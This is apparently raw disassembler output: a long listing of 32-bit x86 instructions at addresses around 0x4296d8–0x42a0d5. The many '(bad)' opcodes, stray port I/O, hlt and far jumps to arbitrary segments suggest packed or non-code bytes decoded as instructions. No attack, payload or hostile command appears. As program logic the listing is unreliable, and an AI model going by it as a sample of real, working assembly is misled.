  4296d8:	out    0xc0,al
  4296da:	idiv   bl
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	jp     0x4296f6
  4296e4:	pusha  
  4296e5:	ja     0x42974e
  4296e7:	mov    esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	mov    edi,0x9ddfca25
  4296f3:	rcl    BYTE PTR ds:[edi+0xb0e609a],cl
  4296fa:	adc    DWORD PTR [ebx],edx
  4296fc:	cmp    ah,BYTE PTR [eax]
  4296fe:	push   0xc43bcd38
  429703:	fisubr DWORD PTR [edx]
  429705:	and    ecx,DWORD PTR [esi]
  429707:	mov    ebx,0x3bc5435f
  42970c:	cmp    al,BYTE PTR ds:0x4de5da3a
  429712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429713:	xor    ebx,DWORD PTR [edi+0x7efba12c]
  429719:	mov    dl,0x1a
  42971b:	clc    
  42971c:	pop    es
  42971d:	xchg   esp,eax
  42971e:	jge    0x429701
  429720:	mov    edi,0xc90dcab6
  429725:	mov    al,ds:0xfe0731e1
  42972a:	mov    dl,0x6a
  42972c:	pop    edx
  42972d:	xor    ch,BYTE PTR [edi+0x5459d26c]
  429733:	mov    ds:0xb05b4bbc,eax
  429738:	cld    
  429739:	mov    al,0x3d
  42973b:	imul   esp,DWORD PTR [edi+0x74eecf83],0x18
  429742:	hlt    
  429743:	aad    0x23
  429745:	inc    eax
  429746:	sub    BYTE PTR [eax],bl
  429748:	lods   eax,DWORD PTR ds:[esi]
  429749:	xchg   BYTE PTR [ebx+eax*4-0x2d],ah
  42974d:	call   0xbaf7:0xfe13730b
  429754:	push   eax
  429755:	fcom   QWORD PTR [esi]
  429757:	ja     0x429792
  429759:	std    
  42975a:	push   0xb
  42975c:	imul   ebx,DWORD PTR [edx+0x47],0x52
  429760:	scas   al,BYTE PTR es:[edi]
  429761:	and    BYTE PTR [ecx+0x5f],al
  429764:	or     al,BYTE PTR [esp+esi*2-0x10]
  429768:	fmul   DWORD PTR [ebx+0x50]
  42976b:	jge    0x429759
  42976d:	in     eax,0x18
  42976f:	sub    ax,0xc044
  429773:	add    eax,0x7f912a2f
  429778:	pop    ebx
  429779:	test   al,0x7
  42977b:	mov    dl,0x11
  42977d:	call   0x7db5c7d4
  429782:	jae    0x429721
  429784:	cmp    ecx,DWORD PTR [edi+ecx*4-0xb51edca]
  42978b:	mov    al,0xe8
  42978d:	cmp    DWORD PTR [ebp-0xcdf147f],ebx
  429793:	arpl   sp,bp
  429795:	clc    
  429796:	daa    
  429797:	xchg   ecx,eax
  429798:	jmp    0x7ad6:0x64d64a1e
  42979f:	jecxz  0x4297cc
  4297a1:	mov    edx,0x4834a68
  4297a6:	pop    ecx
  4297a7:	icebp  
  4297a8:	mov    ebx,0xbe637ef0
  4297ad:	out    dx,eax
  4297ae:	stos   DWORD PTR es:[edi],eax
  4297af:	(bad)  
  4297b0:	jne    0x429830
  4297b2:	jg     0x429780
  4297b4:	sti    
  4297b5:	pop    ecx
  4297b6:	jge    0x429835
  4297b8:	(bad)  
  4297b9:	aam    0xb3
  4297bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297bc:	pusha  
  4297bd:	cld    
  4297be:	(bad)  
  4297bf:	outs   dx,BYTE PTR ds:[esi]
  4297c0:	push   ss
  4297c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297c2:	fadd   st(2),st
  4297c4:	dec    eax
  4297c5:	rcr    ecx,1
  4297c7:	jno    0x42976d
  4297c9:	add    BYTE PTR [ecx-0x12],dl
  4297cc:	pop    ebx
  4297cd:	dec    ebx
  4297ce:	pop    ds
  4297cf:	gs xor eax,0xa71152bb
  4297d5:	mov    ds:0xb0b929e3,al
  4297da:	mov    al,0xd6
  4297dc:	mov    ds:0xda01820d,eax
  4297e1:	pop    eax
  4297e2:	out    dx,al
  4297e3:	xchg   edx,eax
  4297e4:	sbb    eax,0x6d1e7add
  4297e9:	out    0xa0,al
  4297eb:	inc    ebx
  4297ec:	mov    DWORD PTR [eax+eax*1+0x0],esp
	...
  429854:	add    BYTE PTR [eax],al
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	popa   
  429863:	cs out dx,eax
  429865:	push   edx
  429866:	addr16 mov ebp,0x1000001
  42986c:	add    BYTE PTR [eax],al
  42986e:	outs   dx,BYTE PTR ds:[esi]
  42986f:	sub    esp,DWORD PTR ds:0x5bae523e
  429875:	shl    dh,0x81
  429878:	outs   dx,BYTE PTR ds:[esi]
  429879:	add    dl,dh
  42987b:	pop    edi
  42987c:	mov    ebp,0xb5d18bab
  429881:	pushf  
  429882:	mov    ch,0xb
  429884:	rcr    dl,0x12
  429887:	mov    ds:0x8d55e8a7,eax
  42988c:	cld    
  42988d:	push   edx
  42988e:	call   0x810:0x2824ba5f
  429895:	les    ebx,FWORD PTR [edi-0xd4efdfd]
  42989b:	jmp    0x429832
  42989d:	mov    cl,0x7c
  42989f:	icebp  
  4298a0:	outs   dx,BYTE PTR ds:[esi]
  4298a1:	mov    cl,0xf6
  4298a3:	pop    ds
  4298a4:	es push eax
  4298a6:	and    DWORD PTR [esi+0x55733003],ecx
  4298ac:	or     BYTE PTR ds:0xa6c29e72,0xfd
  4298b3:	(bad)  
  4298b4:	fld    QWORD PTR [edi+ecx*1-0x17]
  4298b8:	test   BYTE PTR [edx],0x3
  4298bb:	xchg   cl,bl
  4298bd:	sbb    DWORD PTR [esi-0x29],esi
  4298c0:	cs pop es
  4298c2:	nop    DWORD PTR [edx+0x51db3c57]
  4298c9:	cs mov dl,0x71
  4298cc:	fsub   DWORD PTR [ecx]
  4298ce:	dec    edx
  4298cf:	rol    BYTE PTR [eax+0x14],cl
  4298d2:	(bad)  
  4298d3:	cli    
  4298d4:	ins    BYTE PTR es:[edi],dx
  4298d5:	jmp    0x7b69199d
  4298da:	iret   
  4298db:	aaa    
  4298dc:	cs popf 
  4298de:	pop    bx
  4298e0:	les    ecx,FWORD PTR [ecx+0x2b546529]
  4298e6:	sahf   
  4298e7:	inc    edi
  4298e8:	stos   DWORD PTR es:[edi],eax
  4298e9:	xchg   esi,eax
  4298ea:	mov    ds:0xb26da435,eax
  4298ef:	add    ch,ah
  4298f1:	(bad)  
  4298f2:	pushf  
  4298f3:	jnp    0x42987d
  4298f5:	lea    edi,[ebp+0x2d606992]
  4298fb:	test   BYTE PTR gs:[ecx-0x38dc6c58],bl
  429902:	mov    WORD PTR [ecx-0x429c465c],ds
  429908:	sbb    BYTE PTR [eax+0x125178c7],al
  42990e:	sbb    dh,dl
  429910:	fiadd  DWORD PTR [edi+ebx*8]
  429913:	dec    esi
  429914:	dec    esi
  429915:	push   ss
  429916:	mov    edx,0x49a206e0
  42991b:	xchg   esi,eax
  42991c:	dec    esp
  42991d:	nop
  42991e:	mov    dl,0x1f
  429920:	sar    DWORD PTR [ecx+ebx*2],cl
  429923:	out    dx,eax
  429924:	adc    dl,BYTE PTR [esi+0x77]
  429927:	xchg   esp,eax
  429928:	and    edi,DWORD PTR [ecx+ecx*4+0x27]
  42992c:	sahf   
  42992d:	fldenv [ecx+0x2eafcd0b]
  429933:	pop    edx
  429934:	mov    ds:0xc87c2bc0,al
  429939:	push   eax
  42993a:	(bad)  
  42993b:	jg     0x4298be
  42993d:	gs dec edi
  42993f:	(bad)  
  429940:	xor    edx,DWORD PTR [ecx+ebx*1+0x31]
  429944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429945:	outs   dx,DWORD PTR ds:[esi]
  429946:	jae    0x429928
  429948:	cmp    DWORD PTR [ebx],ebx
  42994a:	mov    edx,0x4452cfc
  42994f:	out    dx,al
  429950:	scas   eax,DWORD PTR es:[edi]
  429951:	cmp    eax,0xf04e2766
  429956:	dec    edx
  429957:	cmp    esi,DWORD PTR [edi+ebx*1-0x29]
  42995b:	mov    edx,0xa7807602
  429960:	and    al,0x5b
  429962:	cwde   
  429963:	adc    ah,BYTE PTR [esi-0x3e]
  429966:	jns    0x4299d6
  429968:	(bad)  
  429969:	adc    eax,0xbc6cd96f
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	inc    ecx
  4299e3:	fsubrp st(5),st
  4299e5:	ja     0x429a4e
  4299e7:	mov    esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	adc    ch,BYTE PTR [edx+ebp*2]
  4299f1:	fidiv  DWORD PTR [ecx+0x4b]
  4299f4:	fidiv  WORD PTR [esi+0x6d]
  4299f7:	repz test BYTE PTR [ebp+edi*4+0x53],bh
  4299fc:	xlat   BYTE PTR ds:[ebx]
  4299fd:	cld    
  4299fe:	add    BYTE PTR [ebx+0x7865bf2e],ah
  429a04:	dec    edi
  429a05:	pop    ebx
  429a06:	(bad)  
  429a07:	data16 jg 0x429997
  429a0a:	aaa    
  429a0b:	pop    ecx
  429a0c:	scas   eax,DWORD PTR es:[edi]
  429a0d:	xlat   BYTE PTR ds:[ebx]
  429a0e:	fist   WORD PTR [eax+0x5e48cf65]
  429a14:	cwde   
  429a15:	sub    al,0xfe
  429a17:	xor    al,0x68
  429a19:	mov    al,0xcd
  429a1b:	pop    edi
  429a1c:	aad    0xfa
  429a1e:	dec    ebx
  429a1f:	scas   eax,DWORD PTR es:[edi]
  429a20:	aas    
  429a21:	aad    0x7a
  429a23:	cmp    DWORD PTR [ecx+0x57],esi
  429a26:	mov    ecx,0xb2e675ea
  429a2b:	outs   dx,DWORD PTR ds:[esi]
  429a2c:	mov    cl,0x2a
  429a2e:	es xor edx,ecx
  429a31:	into   
  429a32:	mov    al,ds:0x9bcf7c04
  429a37:	mov    bh,0x7
  429a39:	dec    esp
  429a3a:	loopne 0x4299cc
  429a3c:	jg     0x4299f3
  429a3e:	stos   BYTE PTR es:[edi],al
  429a3f:	xor    eax,0xb573d1cc
  429a44:	sub    esi,ecx
  429a46:	sti    
  429a47:	(bad)  
  429a48:	xchg   edx,eax
  429a49:	hlt    
  429a4a:	rol    DWORD PTR [ebx-0x2],cl
  429a4d:	hlt    
  429a4e:	out    dx,al
  429a4f:	bound  eax,QWORD PTR [edx+0x5e]
  429a52:	out    0x11,al
  429a54:	push   edi
  429a55:	cmp    eax,0xa9adba5e
  429a5a:	repnz xor eax,0xd74bc98
  429a60:	xor    ah,BYTE PTR [eax-0x7d]
  429a63:	dec    edx
  429a64:	das    
  429a65:	clc    
  429a66:	mov    esi,0x36e836
  429a6b:	add    eax,0xc67f4cd7
  429a70:	(bad)  
  429a71:	call   0x204656d8
  429a76:	mov    gs:0x8a5e684,al
  429a7c:	pop    eax
  429a7d:	call   0xd2b5:0xa30bbd17
  429a84:	xchg   ebx,eax
  429a85:	mov    ds:0xcefcc32d,eax
  429a8a:	cmp    esi,DWORD PTR [eax+0x18]
  429a8d:	ja     0x429a55
  429a8f:	dec    eax
  429a90:	xor    eax,0x435b755c
  429a95:	cmc    
  429a96:	cmc    
  429a97:	jo     0x429a50
  429a99:	inc    ecx
  429a9a:	cs mov ebp,0x27c43a00
  429aa0:	sbb    al,0x12
  429aa2:	shl    BYTE PTR [edi],cl
  429aa4:	aas    
  429aa5:	adc    al,0x68
  429aa7:	ret    
  429aa8:	ins    DWORD PTR es:[edi],dx
  429aa9:	and    ch,al
  429aab:	dec    eax
  429aac:	lods   eax,DWORD PTR ds:[esi]
  429aad:	bound  ecx,QWORD PTR [edx]
  429aaf:	mov    eax,DWORD PTR [edi]
  429ab1:	mov    ds:0xa4e8f099,al
  429ab6:	mov    esi,0x1ddcb8a0
  429abb:	sub    al,0x17
  429abd:	lds    edi,FWORD PTR [eax]
  429abf:	fs dec eax
  429ac1:	(bad)  
  429ac3:	pop    edi
  429ac4:	(bad)  
  429ac5:	icebp  
  429ac6:	mov    dh,0x70
  429ac8:	setl   BYTE PTR [ecx-0x9]
  429acc:	xchg   edx,eax
  429acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ace:	or     edx,DWORD PTR ds:0x639ddac2
  429ad4:	or     DWORD PTR [esi+ebx*1],ebx
  429ad7:	nop
  429ad8:	fwait
  429ad9:	(bad)
  429adc:	xchg   ebx,esi
  429ade:	pop    ebp
  429adf:	arpl   WORD PTR [ecx+0x3f57d3e6],ax
  429ae5:	jae    0x429a82
  429ae7:	adc    eax,0x2572f3a6
  429aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429aed:	hlt    
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0xaca95667
  429b63:	mov    esp,DWORD PTR [edx]
  429b65:	jmp    0x100:0x1bf67
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	std    
  429b6f:	sub    eax,0x3e06c6f6
  429b74:	xchg   BYTE PTR [esi+esi*8],al
  429b77:	les    ebp,FWORD PTR [eax]
  429b79:	inc    eax
  429b7a:	int    0x60
  429b7c:	pop    edx
  429b7d:	call   0x95fb4ed4
  429b82:	dec    ebx
  429b83:	lods   al,BYTE PTR ds:[esi]
  429b84:	mov    ch,0x6e
  429b86:	aad    0xfc
  429b88:	push   esp
  429b89:	or     eax,esi
  429b8b:	or     al,0xb6
  429b8d:	mov    cl,0xcf
  429b8f:	push   ebp
  429b90:	xchg   ebx,eax
  429b91:	xor    DWORD PTR [ecx],edi
  429b93:	add    BYTE PTR [edi-0x49],ah
  429b96:	pop    ss
  429b97:	int    0x8e
  429b99:	pop    DWORD PTR [edx]
  429b9b:	cmp    BYTE PTR [ebx],cl
  429b9d:	nop
  429b9e:	(bad)  
  429b9f:	call   0x550d:0xf2e1c58
  429ba6:	mul    BYTE PTR [ebp-0x7e]
  429ba9:	loope  0x429b69
  429bab:	(bad)  
  429bac:	sti    
  429bad:	in     al,0x2c
  429baf:	into   
  429bb0:	push   edx
  429bb1:	adc    eax,0x7f0c040e
  429bb6:	mov    al,ds:0x79049ce
  429bbb:	xor    DWORD PTR [ecx],esp
  429bbd:	arpl   ax,cx
  429bbf:	add    ah,BYTE PTR [ebx-0x61]
  429bc2:	xor    esp,DWORD PTR [eax]
  429bc4:	fs jg  0x429be8
  429bc7:	cmp    ebx,ecx
  429bc9:	xor    BYTE PTR [esi],bh
  429bcb:	into   
  429bcc:	loope  0x429c45
  429bce:	jns    0x429c10
  429bd0:	sub    eax,0x9bfadc68
  429bd5:	pop    esp
  429bd6:	aam    0xe3
  429bd8:	mov    edx,0x742f028b
  429bdd:	outs   dx,DWORD PTR ds:[esi]
  429bde:	ss adc esi,esp
  429be1:	(bad)  
  429be3:	(bad)  
  429be4:	xchg   esi,eax
  429be5:	rcl    BYTE PTR [ecx-0x6a],cl
  429be8:	dec    ecx
  429be9:	inc    ebx
  429bea:	push   0x95f07fa1
  429bef:	push   ebx
  429bf0:	dec    ecx
  429bf1:	add    al,0xff
  429bf3:	ss push ds
  429bf5:	adc    DWORD PTR ds:0x497ae252,edx
  429bfb:	(bad)  
  429bfc:	popa   
  429bfd:	fwait
  429bfe:	test   al,0xa
  429c00:	xchg   ecx,eax
  429c01:	mov    al,ds:0x174f7239
  429c06:	dec    esi
  429c07:	jg     0x429c32
  429c09:	xor    esp,DWORD PTR [ebp+0x7a640cef]
  429c0f:	out    0x96,eax
  429c11:	pop    ecx
  429c12:	retf   
  429c13:	push   ebp
  429c14:	sti    
  429c15:	data16 jle 0x429bbd
  429c18:	mov    cl,0x97
  429c1a:	mov    ecx,0xe2d105ae
  429c1f:	or     DWORD PTR [ebp-0x4cd90a40],ebp
  429c25:	sbb    eax,0x78a123f8
  429c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c2b:	push   esi
  429c2c:	or     BYTE PTR [esi+0x6af01681],al
  429c32:	mov    ebp,0xcdceda47
  429c37:	push   ecx
  429c38:	scas   al,BYTE PTR es:[edi]
  429c39:	push   ss
  429c3a:	scas   al,BYTE PTR es:[edi]
  429c3b:	repnz inc eax
  429c3d:	inc    eax
  429c3e:	xchg   edi,eax
  429c3f:	mov    ch,0x9f
  429c41:	outs   dx,DWORD PTR ds:[esi]
  429c42:	pop    esi
  429c43:	mov    ebx,0xcb44302e
  429c48:	test   dl,dl
  429c4a:	xor    al,0x5
  429c4c:	jecxz  0x429c3d
  429c4e:	pop    ecx
  429c4f:	(bad)  
  429c51:	mov    bl,0x29
  429c53:	jno    0x429c2c
  429c55:	inc    esi
  429c56:	jl     0x429cbe
  429c58:	or     eax,0xad338a95
  429c5d:	add    ah,bh
  429c5f:	es or  ah,dh
  429c62:	in     eax,dx
  429c63:	(bad)  
  429c64:	pusha  
  429c65:	sbb    ebp,DWORD PTR [ebx+0x70975c18]
  429c6b:	add    BYTE PTR [edx+ecx*4],cl
	...
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ebp+0x30],cl
  429ce4:	pop    ecx
  429ce5:	in     al,dx
  429ce6:	rol    BYTE PTR [bx+di],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	mov    es,WORD PTR [eax]
  429cf0:	adc    dl,BYTE PTR [edx+0x18]
  429cf3:	cmp    bl,BYTE PTR [ebx-0x4e878560]
  429cf9:	(bad)  
  429cfa:	jmp    0x7313d7b
  429cff:	jg     0x429cfc
  429d01:	(bad)  
  429d02:	test   DWORD PTR [esi],0x3ee8b89
  429d08:	imul   esp,edx,0x6
  429d0b:	outs   dx,BYTE PTR ds:[esi]
  429d0c:	nop
  429d0d:	mov    eax,0xc46b7cd3
  429d12:	icebp  
  429d13:	fimul  WORD PTR [ebx-0x6]
  429d16:	push   ecx
  429d17:	es cli 
  429d19:	push   ds
  429d1a:	or     ebx,esp
  429d1c:	fadd   QWORD PTR [esi+ebp*8]
  429d1f:	add    eax,0x138a4e14
  429d24:	or     eax,ebx
  429d26:	clc    
  429d27:	paddsb mm5,QWORD PTR [edx-0x6c]
  429d2b:	bnd jo 0x429d42
  429d2e:	jno    0x429d8f
  429d30:	mov    ds:0xc593eac7,al
  429d35:	adc    al,0x35
  429d37:	dec    ebx
  429d38:	loope  0x429d9d
  429d3a:	xor    BYTE PTR [ebx],cl
  429d3c:	(bad)  
  429d3e:	inc    edx
  429d3f:	inc    edx
  429d40:	stos   DWORD PTR es:[edi],eax
  429d41:	push   ebx
  429d42:	test   al,0xb3
  429d44:	adc    DWORD PTR [ecx-0x165dc997],ebx
  429d4a:	fld    DWORD PTR [esi+0x5c]
  429d4d:	push   ebx
  429d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d4f:	mov    ds:0x22572935,al
  429d54:	pop    ebx
  429d55:	inc    eax
  429d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d57:	sub    bh,bl
  429d59:	fadd   st(2),st
  429d5b:	div    BYTE PTR [edx]
  429d5d:	in     eax,0x70
  429d5f:	mov    esi,0x40a24d5a
  429d64:	sbb    DWORD PTR [edi-0x6],edx
  429d67:	or     BYTE PTR [eax+0x6c],bl
  429d6a:	mov    bl,0x31
  429d6c:	setbe  BYTE PTR [edx]
  429d6f:	or     bh,BYTE PTR [esi]
  429d71:	and    BYTE PTR ss:[esi+0x297dbfa9],0x7e
  429d79:	sbb    BYTE PTR [eax-0x2],0x15
  429d7d:	jmp    0x4c01da09
  429d82:	jg     0x429d4c
  429d84:	(bad)  
  429d85:	in     al,dx
  429d86:	jg     0x429dde
  429d88:	leave  
  429d89:	mov    esp,fs
  429d8b:	in     eax,dx
  429d8c:	int3   
  429d8d:	mov    ah,0x62
  429d8f:	dec    ebx
  429d90:	jmp    0x429d23
  429d92:	arpl   WORD PTR [esi],dx
  429d94:	adc    BYTE PTR [ebp+0x41],cl
  429d97:	pop    esp
  429d98:	cmp    eax,0xe1dbfec2
  429d9d:	cli    
  429d9e:	clc    
  429d9f:	mov    cl,0x8e
  429da1:	ins    DWORD PTR es:[edi],dx
  429da2:	pop    ebp
  429da3:	stc    
  429da4:	loopne 0x429d81
  429da6:	inc    edx
  429da7:	sbb    ebx,esi
  429da9:	sub    eax,0x74204680
  429dae:	sub    esp,DWORD PTR [esi-0x6517f577]
  429db4:	mov    esp,0x7309962c
  429db9:	test   bh,ch
  429dbb:	test   eax,0xbd7b5fc
  429dc0:	(bad)  
  429dc1:	test   ebp,edx
  429dc3:	scas   eax,DWORD PTR es:[edi]
  429dc4:	xchg   BYTE PTR [ebp+0x3f3dfff3],cl
  429dca:	xchg   esp,eax
  429dcb:	cdq    
  429dcc:	test   eax,0xe3d05beb
  429dd1:	xor    BYTE PTR [esi+edi*2+0xf],dh
  429dd5:	mov    cl,0x44
  429dd7:	or     esp,ebx
  429dd9:	sbb    eax,0x2f10c2f5
  429dde:	repz jle 0x429da8
  429de1:	cld    
  429de2:	jmp    0x9601:0x5b324fb2
  429de9:	mov    dl,0x43
  429deb:	loop   0x429dd8
  429ded:	sub    DWORD PTR [eax],eax
	...
  429e53:	add    BYTE PTR [eax],al
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	popf   
  429e63:	add    DWORD PTR [esi-0x47],0x67
  429e67:	rol    DWORD PTR [ecx],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	adc    ebp,edx
  429e70:	sbb    al,0xb3
  429e72:	lahf   
  429e73:	push   ebx
  429e74:	mov    ds:0xb9158bd7,al
  429e79:	dec    edx
  429e7a:	sbb    eax,0x11f11d75
  429e7f:	pop    es
  429e80:	push   ebp
  429e81:	lock inc esi
  429e83:	rep ins DWORD PTR es:[edi],dx
  429e85:	sbb    edx,DWORD PTR [eax]
  429e87:	sbb    eax,DWORD PTR [edx]
  429e89:	sub    al,0x6d
  429e8b:	cmp    WORD PTR [ecx],bp
  429e8e:	mov    DWORD PTR [ebp-0x5f46d194],edx
  429e94:	xor    DWORD PTR [esp+ebx*8],edi
  429e97:	sbb    BYTE PTR [eax+0x16],0xf8
  429e9b:	add    ch,bl
  429e9d:	push   0x1e
  429e9f:	cmp    al,0x42
  429ea1:	pop    esp
  429ea2:	cs (bad) 
  429ea4:	scas   eax,DWORD PTR es:[edi]
  429ea5:	or     al,cl
  429ea7:	push   esi
  429ea8:	out    0xe0,al
  429eaa:	add    eax,0x92ae6339
  429eaf:	push   edi
  429eb0:	sub    BYTE PTR [eax+0x75],bl
  429eb3:	je     0x429e9c
  429eb5:	xor    al,0x85
  429eb7:	adc    BYTE PTR [ebp+ebx*4+0x17],ah
  429ebb:	or     BYTE PTR [eax+0x6478cf2],bl
  429ec1:	test   BYTE PTR [ecx+0x7f],dl
  429ec4:	or     eax,0xe08b3807
  429ec9:	push   0xf1e9c716
  429ece:	dec    edx
  429ecf:	inc    edi
  429ed0:	mov    edx,0x5afa6806
  429ed5:	aaa    
  429ed6:	mov    DWORD PTR ss:[ecx],esi
  429ed9:	xor    bl,bh
  429edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429edc:	lods   eax,DWORD PTR ds:[esi]
  429edd:	outs   dx,BYTE PTR ds:[esi]
  429ede:	mov    ah,bl
  429ee0:	push   ebx
  429ee1:	cmp    al,ch
  429ee3:	retf   0xcecd
  429ee6:	cmp    al,al
  429ee8:	push   ebx
  429ee9:	dec    ch
  429eeb:	add    al,0x40
  429eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429eee:	xchg   DWORD PTR ds:0xb7c2c028,esp
  429ef4:	sbb    dl,cl
  429ef6:	fldenv ds:0x6f70b924
  429efc:	aad    0x78
  429efe:	xor    ebp,ecx
  429f00:	jne    0x429f7a
  429f02:	in     eax,0x5
  429f04:	enter  0x79a9,0x9f
  429f08:	xchg   edi,eax
  429f09:	scas   al,BYTE PTR es:[edi]
  429f0a:	lds    edi,FWORD PTR [edx+0x4]
  429f0d:	and    BYTE PTR [edi-0x1dce2e84],0x88
  429f14:	cmp    DWORD PTR [esi+eax*2+0x509ea742],edi
  429f1b:	push   es
  429f1c:	cmp    ch,BYTE PTR [eax+0x74b633de]
  429f22:	add    DWORD PTR [ebp+0x24],0xe
  429f26:	ret    
  429f27:	pop    esp
  429f28:	iret   
  429f29:	pushf  
  429f2a:	mov    ah,0x26
  429f2c:	(bad)  
  429f2d:	stc    
  429f2e:	sub    al,0x9b
  429f30:	stos   DWORD PTR es:[edi],eax
  429f31:	sub    al,0x93
  429f33:	loope  0x429f2c
  429f35:	ins    BYTE PTR es:[edi],dx
  429f36:	lock out 0xc4,al
  429f39:	inc    edx
  429f3a:	shr    BYTE PTR [eax+0x2c],1
  429f3d:	ret    
  429f3e:	hlt    
  429f3f:	and    DWORD PTR [edx+eiz*8-0x538ec081],ebx
  429f46:	push   eax
  429f47:	or     ebx,esp
  429f49:	dec    ebp
  429f4a:	call   0x6ea3:0x235ad397
  429f51:	faddp  st(0),st
  429f53:	jmp    0x3a114491
  429f58:	popa   
  429f59:	icebp  
  429f5a:	test   BYTE PTR [edx],cl
  429f5c:	cmp    DWORD PTR [ecx],0xffffffec
  429f5f:	fxch   st(6)
  429f61:	out    0xfa,eax
  429f63:	scas   eax,DWORD PTR es:[edi]
  429f64:	jmp    0x429f90
  429f66:	inc    ebp
  429f67:	fsubr  DWORD PTR [edx]
  429f69:	xchg   esp,eax
  429f6a:	shr    BYTE PTR [edi+0x64b],0x0
	...
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x3d7c9828]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	push   0x5
  429ff0:	mov    eax,ds:0xcbe31ad1
  429ff5:	xchg   esp,eax
  429ff6:	xor    BYTE PTR [edi],al
  429ff8:	cdq    
  429ff9:	or     esp,ecx
  429ffb:	repz out 0xfc,eax
  429ffe:	xor    eax,0x62a04271
  42a003:	jg     0x429ffd
  42a005:	push   ecx
  42a006:	jnp    0x429fdc
  42a008:	daa    
  42a009:	ins    DWORD PTR es:[edi],dx
  42a00a:	test   esi,ebp
  42a00c:	sub    ecx,DWORD PTR [ebx-0x1b4ffb88]
  42a012:	xchg   DWORD PTR [esi+edx*8-0x41],esp
  42a016:	sub    esi,edi
  42a018:	and    esi,ebp
  42a01a:	lock loop 0x42a061
  42a01d:	fwait
  42a01e:	sbb    esi,DWORD PTR [ebx]
  42a020:	mov    bl,0x72
  42a022:	pop    es
  42a023:	add    cl,BYTE PTR [edx]
  42a025:	mov    edi,0xd6deff26
  42a02a:	pop    esi
  42a02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a02c:	popf   
  42a02d:	mov    ds:0x658bbe25,eax
  42a032:	sbb    BYTE PTR [edx+0x1eabad5e],dh
  42a038:	dec    ebx
  42a039:	xor    ecx,DWORD PTR [eax]
  42a03b:	scas   al,BYTE PTR es:[edi]
  42a03c:	jno    0x42a043
  42a03e:	ds das 
  42a040:	aam    0x6b
  42a042:	inc    edx
  42a043:	cmp    ebx,DWORD PTR [edi-0x19dad3c5]
  42a049:	inc    edx
  42a04a:	ficom  WORD PTR [ecx]
  42a04c:	mov    esi,0x41b4e937
  42a051:	mov    ds:0xafad88a2,al
  42a056:	mov    ebp,0x8fc994a
  42a05b:	push   0x4
  42a05d:	outs   dx,DWORD PTR ds:[esi]
  42a05e:	and    ebp,eax
  42a060:	fst    QWORD PTR ss:0xc9f61f8d
  42a067:	push   ebx
  42a068:	mov    ch,0xb4
  42a06a:	cdq    
  42a06b:	outs   dx,DWORD PTR ds:[esi]
  42a06c:	sahf   
  42a06d:	cmp    al,0xaa
  42a06f:	mov    esp,0x18b74eb7
  42a074:	adc    DWORD PTR ds:0x3fb0ca95,ecx
  42a07a:	das    
  42a07b:	cdq    
  42a07c:	dec    ebx
  42a07d:	adc    ecx,DWORD PTR [eax]
  42a07f:	dec    ebp
  42a080:	mov    esi,0x862e4cc4
  42a085:	stos   BYTE PTR es:[edi],al
  42a086:	ss xor eax,0x7128502b
  42a08c:	and    bx,sp
  42a08f:	fwait
  42a090:	cmp    edx,esi
  42a092:	sbb    edi,DWORD PTR [ebx]
  42a094:	push   es
  42a095:	pop    ss
  42a096:	ins    DWORD PTR es:[edi],dx
  42a097:	repnz in al,dx
  42a099:	add    bh,BYTE PTR [edx+0x626ff2ff]
  42a09f:	jb     0x42a025
  42a0a1:	in     eax,0x1b
  42a0a3:	div    BYTE PTR [ebx-0x3f4658e0]
  42a0a9:	lea    eax,[eax+0x185641c]
  42a0af:	out    dx,eax
  42a0b0:	fcmove st,st(5)
  42a0b2:	mov    cl,0x3f
  42a0b4:	sub    eax,0x1bc3a151
  42a0b9:	fsub   QWORD PTR [edx-0x29]
  42a0bc:	mov    ds,WORD PTR [eax]
  42a0be:	leave  
  42a0bf:	aam    0x63
  42a0c1:	xchg   BYTE PTR [ebx+0x587ee0ac],ah
  42a0c7:	int    0xd4
  42a0c9:	jmp    0x42a081
  42a0cb:	shl    BYTE PTR [edx+0xd],1
  42a0ce:	adc    eax,0xd0fcaa40
  42a0d3:	(bad)  
  42a0d5:	jge    0x42a06c
